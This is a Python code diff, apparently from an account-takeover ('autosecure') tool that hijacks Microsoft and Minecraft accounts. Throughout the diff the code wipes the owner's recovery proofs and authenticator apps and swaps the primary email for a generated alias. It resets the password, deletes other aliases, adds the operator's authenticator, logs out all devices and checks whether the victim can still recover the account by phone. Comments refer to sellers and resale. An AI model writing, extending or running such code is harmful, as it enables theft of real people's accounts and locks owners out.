@@ -174,9 +174,11 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         account_info["minecraft"]["capes"] = "No capes"
 
     profile = await get_profile(ssid)
-    if profile:
+    if profile and profile.get("name"):
         print("[+] - Got profile (Has Minecraft Java)")
-        account_info["minecraft"]["name"] = profile
+        account_info["minecraft"]["name"] = profile["name"]
+        if profile.get("uuid"):
+            account_info["minecraft"]["uuid"] = profile["uuid"]
 
         try:
             usernameInfo = await get_username_info(ssid)
@@ -190,6 +192,7 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         print("[x] - No Java profile (Bedrock/Game Pass only)")
         account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
         account_info["minecraft"]["uchange"] = "N/A"
+        profile = None
 
     method = await get_method(ssid)
     if method:
@@ -197,6 +200,18 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         print("[+] - Got purchase method")
 
     return "ok" if profile else "no_java"
+
+
+def _is_autosecure_sunny_primary(email: str | None) -> bool:
+    """True if primary is already an autosecure-generated sunny*@outlook.com."""
+    text = str(email or "").strip().lower()
+    if "@" not in text:
+        return False
+    local, _, domain = text.partition("@")
+    if domain != "outlook.com":
+        return False
+    # Current generator: sunny{12 hex}. Also accept legacy sunnymeow.* presets.
+    return local.startswith("sunny")
 
 
 async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, account_info: dict):
@@ -430,11 +445,24 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         # Pass Keys / Windows Hello Exploit
         if apicanary:
             await remove_zyger(session, apicanary)
-            # Removes security_emails / Auth Apps
-            await remove_proof(session, apicanary)
-            print("[+] - Removed all Proofs")
+            # Wipe foreign proofs / auth apps — keep OUR recovery security email
+            # (recovery_secure already attached it; recovery=False skips re-add).
+            keep_sec = (account_info.get("microsoft") or {}).get("security_email")
+            wipe = await remove_proof(
+                session,
+                apicanary,
+                keep_security_email=keep_sec,
+                keep_domain=domain,
+            )
+            if isinstance(wipe, dict):
+                account_info["microsoft"]["has_sms_proof"] = bool(
+                    wipe.get("has_sms_proof")
+                )
+            else:
+                account_info["microsoft"]["has_sms_proof"] = False
         else:
             print("[!] - Skipping remove_zyger/remove_proof (no apiCanary)")
+            account_info["microsoft"]["has_sms_proof"] = None
 
         # Third Party Launchers (Minecraft, Prism)
         await remove_services(session)
@@ -449,26 +477,68 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         # Primary alias replace does NOT require security_parameters / t0 —
         # only apicanary + names/manage session (dona-fork flow).
         if replace_alias:
-            print("[~] - Changing Primary Alias")
-            primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
             ms = account_info.get("microsoft") or {}
             # Preserve seller-visible original before promote
             if not ms.get("original_email"):
                 ms["original_email"] = ms.get("email") or main_email
                 account_info["microsoft"] = ms
-            changed = await change_primary_alias(
-                session,
-                primaryEmail,
-                apicanary,
-                security_email=ms.get("security_email"),
-                account_email=ms.get("original_email") or ms.get("email") or main_email,
-                password=ms.get("password"),
-            )
-            if changed:
-                account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
+
+            current_primary = str(
+                ms.get("email") or main_email or ""
+            ).strip().lower()
+            # Already an autosecure sunny* primary — don't burn another replace
+            if _is_autosecure_sunny_primary(current_primary):
+                print(
+                    f"[+] - Primary already autosecure sunny ({current_primary}) "
+                    "— skipping alias replace"
+                )
+                account_info["microsoft"]["primary_alias_replaced"] = True
+                # Still strip foreign aliases (old outlook / gmail / etc.)
+                print("[~] - Removing foreign aliases while keeping sunny primary")
             else:
-                kept = account_info["microsoft"]["email"]
-                print(f"[X] - Failed to change Primary Email (keeping {kept})")
+                print("[~] - Changing Primary Alias")
+                changed = False
+                last_local = ""
+                max_alias_attempts = 3
+                for attempt in range(1, max_alias_attempts + 1):
+                    primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
+                    last_local = primaryEmail
+                    print(
+                        f"[~] - Primary alias attempt {attempt}/{max_alias_attempts} "
+                        f"({primaryEmail}@outlook.com)"
+                    )
+                    # Refresh canary between retries — stale after MFA / failed AddAssocId
+                    try:
+                        fresh = await get_cookies(session)
+                        if fresh:
+                            apicanary = fresh
+                    except Exception:
+                        pass
+                    changed = await change_primary_alias(
+                        session,
+                        primaryEmail,
+                        apicanary,
+                        security_email=ms.get("security_email"),
+                        account_email=ms.get("original_email") or ms.get("email") or main_email,
+                        password=ms.get("password"),
+                    )
+                    if changed:
+                        account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
+                        account_info["microsoft"]["primary_alias_replaced"] = True
+                        break
+                    if attempt < max_alias_attempts:
+                        await asyncio.sleep(2.0 * attempt)
+
+                if not changed:
+                    kept = account_info["microsoft"]["email"]
+                    account_info["microsoft"]["primary_alias_replaced"] = False
+                    print(
+                        f"[X] - Failed to change Primary Email after "
+                        f"{max_alias_attempts} attempts (keeping {kept}; "
+                        f"last tried {last_local}@outlook.com)"
+                    )
+        else:
+            account_info["microsoft"]["primary_alias_replaced"] = None
 
         if security_parameters:
             if recovery:
@@ -482,9 +552,43 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                 with DBConnection() as database:
                     database.add_security_email(security_email, password)
 
-                # Changes password & generate a new recovery code
-                print(f"[~] - Automaticly Securing Account... ({main_email})")
-                data = await recover(session, main_email, recovery_code, security_email, password)
+                # RecoverUser must use the *current* primary. After MakePrimary the
+                # sunny@ alias is the login identity — resetting against the old
+                # Outlook address often fails parse / leaves sellers with a dead
+                # "Login Email" that no longer works.
+                recover_login = (
+                    str(
+                        (account_info.get("microsoft") or {}).get("email")
+                        or main_email
+                        or ""
+                    ).strip()
+                    or main_email
+                )
+                print(f"[~] - Automaticly Securing Account... ({recover_login})")
+                try:
+                    data = await recover(
+                        session,
+                        recover_login,
+                        recovery_code,
+                        security_email,
+                        password,
+                    )
+                except Exception as exc:
+                    # Keep sunny@ / original_email already written above so give-back
+                    # embeds never fall back to the deleted Outlook primary.
+                    logging.exception(
+                        "RecoverUser failed after alias steps for %s (login=%s)",
+                        main_email,
+                        recover_login,
+                    )
+                    print(
+                        f"[X] - RecoverUser failed ({exc.__class__.__name__}: {exc}) "
+                        f"— primary kept as {recover_login}"
+                    )
+                    account_info["microsoft"]["recover_error"] = (
+                        f"{exc.__class__.__name__}: {exc}"
+                    )
+                    raise
 
                 if data and data != "invalid":
                     account_info["microsoft"]["security_email"] = security_email
@@ -492,30 +596,96 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                     account_info["microsoft"]["password"] = password
                 else:
                     print(f"[X] - Failed to secure this account")
+                    account_info["microsoft"]["recover_error"] = (
+                        "RecoverUser returned no recovery code"
+                    )
+                    raise RuntimeError(
+                        "RecoverUser returned no recovery code after primary alias change"
+                    )
 
         # Delete other login aliases (non-fatal — manage page often lacks canary)
         # Always keep the current primary so a failed MakePrimary doesn't orphan-delete
         # a freshly added sunny* alias (previous bug).
+        # Also runs after sunny-skip so old outlook/gmail aliases still get wiped.
         try:
+            from securing.utils.security.force_password import strip_unverified
+
+            ms_now = account_info.get("microsoft") or {}
             await delete_aliases(
                 session,
-                keep_email=account_info["microsoft"].get("email"),
+                keep_email=ms_now.get("email"),
+                security_email=ms_now.get("security_email"),
+                account_email=ms_now.get("original_email") or ms_now.get("email"),
+                password=strip_unverified(ms_now.get("password")),
             )
         except Exception as exc:
             logging.warning("delete_aliases soft-skip: %s", exc)
             print(f"[~] - Skipping alias removal ({exc.__class__.__name__})")
 
+        # Always verify password stuck after RecoverUser — MS often rotates the
+        # recovery code while silently ignoring the new password. Previously we
+        # only ran this when marked UNVERIFIED, so Sell (2FA) got a dead password.
+        try:
+            from securing.utils.security.force_password import ensure_password_verified
+
+            ms_pwd = str((account_info.get("microsoft") or {}).get("password") or "")
+            if ms_pwd and ms_pwd not in ("Unknown", "Couldn't Change!", "Failed"):
+                await ensure_password_verified(
+                    session,
+                    account_info,
+                    force_if_unverified=True,
+                    force_if_bad=True,
+                )
+        except Exception as exc:
+            logging.warning("force password soft-skip: %s", exc)
+
         # Add Authenticator
         if enable_2fa:
-            auth = await add_authenticator(session)
-            account_info["microsoft"]["auth_secret"] = auth
-            print(f"[+] - Added Authenticator ({auth})")
+            try:
+                auth = await add_authenticator(session)
+                account_info["microsoft"]["auth_secret"] = auth
+                print(f"[+] - Added Authenticator ({auth})")
+            except Exception as exc:
+                log.exception("add_authenticator failed")
+                print(f"[X] - Failed to add authenticator: {exc.__class__.__name__}: {exc}")
+                account_info["microsoft"]["auth_secret"] = "Failed"
+        else:
+            print("[~] - enable_2fa is off — skipping authenticator")
 
         # Logout all devices
         if apicanary:
             await logout_all(session, apicanary)
         else:
             print("[!] - Skipping logout_all (no apiCanary)")
+
+        # Phone pullback probe — HasPhone can stay 1 even when smsProofs is empty
+        # on the manage page (ghost phone / legacy SMS recovery).
+        try:
+            from securing.autobuy_hold_check import fetch_credential_type
+
+            probe_email = (
+                (account_info.get("microsoft") or {}).get("email")
+                or main_email
+                or ""
+            ).strip()
+            has_phone = None
+            if probe_email:
+                gct = await fetch_credential_type(probe_email)
+                creds = (gct or {}).get("Credentials") or {}
+                raw = creds.get("HasPhone")
+                has_phone = raw in (1, "1", True)
+                account_info["microsoft"]["has_phone"] = has_phone
+                if has_phone:
+                    print(
+                        "[!] - HasPhone=1 after proof wipe — SMS/ACSR pullback still possible"
+                    )
+                else:
+                    print("[+] - HasPhone cleared (no phone recovery flag)")
+            else:
+                account_info["microsoft"]["has_phone"] = None
+        except Exception as exc:
+            logging.warning("HasPhone probe soft-skip: %s", exc)
+            account_info["microsoft"]["has_phone"] = None
         
     print("[+] - Account has been secured")
     return account_info
